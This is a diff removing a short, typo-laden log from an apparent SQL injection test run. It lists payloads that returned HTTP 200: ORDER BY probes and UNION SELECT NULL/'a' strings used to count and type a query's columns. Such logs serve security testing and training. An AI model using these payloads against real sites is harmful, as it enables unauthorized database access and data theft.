@@ -1,6 +1,0 @@
-this is the respons of the testing of live == <Response [200]>
-this this the payloads that make it with 200: 'ORDER BY 1 --
-this this the payloads that make it with 200: 'ORDER BY 2 --
-this this the payloads that make it with 200 defing what is the type of the coloum:  'UNION SELECT NULL,NULL--
-this this the payloads that make it with 200 defing what is the type of the coloum:  'UNION SELECT NULL,'a'--
-this this the payloads that make it with 200 defing what is the type of the coloum:  'UNION SELECT NULL,'a'--
